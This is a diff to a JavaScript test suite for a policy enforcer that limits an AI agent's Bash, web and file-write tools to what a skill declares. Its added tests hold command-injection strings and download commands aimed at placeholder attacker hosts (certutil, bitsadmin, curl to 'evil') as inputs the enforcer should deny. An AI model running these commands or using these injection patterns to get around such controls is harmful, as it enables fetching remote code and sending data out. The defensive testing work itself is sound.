@@ -4,7 +4,8 @@ import { readdir, readFile, access } from 'node:fs/promises';
 import { join } from 'node:path';
 import {
   compileSkillPolicyFrontmatter,
-  enforcePolicy
+  enforcePolicy,
+  hasShellControlSyntax
 } from '../lib/capabilities/claude-policy-compiler.mjs';
 
 const baseCaps = {
@@ -13,14 +14,15 @@ const baseCaps = {
   write: { scope: 'skill' }
 };
 
-function policy(overrides = {}) {
+function policy(overrides = {}, roots = {}) {
   return {
     schemaVersion: 1,
     capabilities: {
       ...baseCaps,
       ...overrides
     },
-    __skillRoot: 'C:\\skills\\demo'
+    __skillRoot: roots.__skillRoot ?? 'C:\\skills\\demo',
+    __projectRoot: roots.__projectRoot ?? 'C:\\projects\\app'
   };
 }
 
@@ -80,6 +82,28 @@ test('WebFetch and WebSearch deny when network undeclared', () => {
   }
 });
 
+test('WebSearch denies when network allowed but searchAllowed absent or false', () => {
+  const absent = enforcePolicy(
+    { tool_name: 'WebSearch', tool_input: { query: 'x' } },
+    policy({ network: { allowed: true, hosts: ['api.example.com'] } })
+  );
+  assert.match(denyReason(absent), /searchAllowed is not declared/);
+
+  const falseFlag = enforcePolicy(
+    { tool_name: 'WebSearch', tool_input: { query: 'x' } },
+    policy({ network: { allowed: true, searchAllowed: false, hosts: [] } })
+  );
+  assert.match(denyReason(falseFlag), /searchAllowed is not declared/);
+});
+
+test('WebSearch allows when network and searchAllowed are true', () => {
+  const allowed = enforcePolicy(
+    { tool_name: 'WebSearch', tool_input: { query: 'skillsforge' } },
+    policy({ network: { allowed: true, searchAllowed: true, hosts: [] } })
+  );
+  assert.equal(allowed, null);
+});
+
 test('WebFetch denies undeclared host and allows declared host', () => {
   const withNetwork = policy({
     network: { allowed: true, hosts: ['api.example.com'] }
@@ -117,6 +141,64 @@ test('Bash denies undeclared exec and undeclared commands', () => {
   assert.equal(allowed, null);
 });
 
+test('Bash denies shell control syntax before allowlist matching', () => {
+  const caps = policy({ exec: { allowed: true, commands: ['node scripts/run.mjs'] } });
+  const injections = [
+    'node scripts/run.mjs; curl evil',
+    'node scripts/run.mjs && curl evil',
+    'node scripts/run.mjs || curl evil',
+    'node scripts/run.mjs | curl evil',
+    'node scripts/run.mjs > /tmp/out',
+    'node scripts/run.mjs < /tmp/in',
+    'node scripts/run.mjs\ncurl evil',
+    'node scripts/run.mjs `curl evil`',
+    'node scripts/run.mjs $(curl evil)'
+  ];
+  for (const command of injections) {
+    assert.equal(hasShellControlSyntax(command), true, command);
+    const decision = enforcePolicy({ tool_name: 'Bash', tool_input: { command } }, caps);
+    assert.match(denyReason(decision), /disallowed control syntax/, command);
+  }
+});
+
+test('Bash allows safe exact CLI invocations matching declared commands', () => {
+  const caps = policy({ exec: { allowed: true, commands: ['node scripts/run.mjs', 'npm test'] } });
+  assert.equal(
+    enforcePolicy({ tool_name: 'Bash', tool_input: { command: 'node scripts/run.mjs' } }, caps),
+    null
+  );
+  assert.equal(
+    enforcePolicy({ tool_name: 'Bash', tool_input: { command: 'node scripts/run.mjs --flag value' } }, caps),
+    null
+  );
+  assert.equal(
+    enforcePolicy({ tool_name: 'Bash', tool_input: { command: 'npm test' } }, caps),
+    null
+  );
+});
+
+test('Bash denies undeclared network clients when network capability is undeclared', () => {
+  const cases = [
+    ['curl', 'curl https://api.example.com'],
+    ['wget', 'wget https://api.example.com'],
+    ['Invoke-WebRequest', 'Invoke-WebRequest https://api.example.com'],
+    ['Invoke-RestMethod', 'Invoke-RestMethod https://api.example.com'],
+    ['iwr', 'iwr https://api.example.com'],
+    ['bitsadmin', 'bitsadmin /transfer job https://evil.example /tmp/x'],
+    ['certutil', 'certutil -urlcache -split -f https://evil.example/x out.bin'],
+    ['python', 'python -c "import urllib.request as u"'],
+    ['node', 'node -e "fetch(\'https://evil\')"']
+  ];
+  for (const [declared, command] of cases) {
+    assert.equal(hasShellControlSyntax(command), false, command);
+    const decision = enforcePolicy(
+      { tool_name: 'Bash', tool_input: { command } },
+      policy({ exec: { allowed: true, commands: [declared] } })
+    );
+    assert.match(denyReason(decision), /network capability is not declared/, command);
+  }
+});
+
 test('Bash denies shell network when network capability is undeclared', () => {
   const decision = enforcePolicy(
     { tool_name: 'Bash', tool_input: { command: 'curl https://api.example.com' } },
@@ -141,6 +223,31 @@ test('Write and Edit deny outside skill scope and allow inside', () => {
 
   const allowed = enforcePolicy(
     { tool_name: 'Write', tool_input: { file_path: 'C:\\skills\\demo\\output.txt', content: 'ok' } },
+    caps
+  );
+  assert.equal(allowed, null);
+});
+
+test('Write and Edit deny missing path for declared write scopes', () => {
+  for (const scope of ['skill', 'none', 'project']) {
+    const decision = enforcePolicy(
+      { tool_name: 'Write', tool_input: { content: 'x' } },
+      policy({ write: { scope } })
+    );
+    assert.match(denyReason(decision), /write path is required/, scope);
+  }
+});
+
+test('Write denies outside project root when scope is project', () => {
+  const caps = policy({ write: { scope: 'project' } }, { __projectRoot: 'C:\\projects\\app' });
+  const denied = enforcePolicy(
+    { tool_name: 'Write', tool_input: { file_path: 'C:\\elsewhere\\secret.txt', content: 'x' } },
+    caps
+  );
+  assert.match(denyReason(denied), /write escapes project scope/);
+
+  const allowed = enforcePolicy(
+    { tool_name: 'Write', tool_input: { file_path: 'C:\\projects\\app\\src\\a.txt', content: 'ok' } },
     caps
   );
   assert.equal(allowed, null);
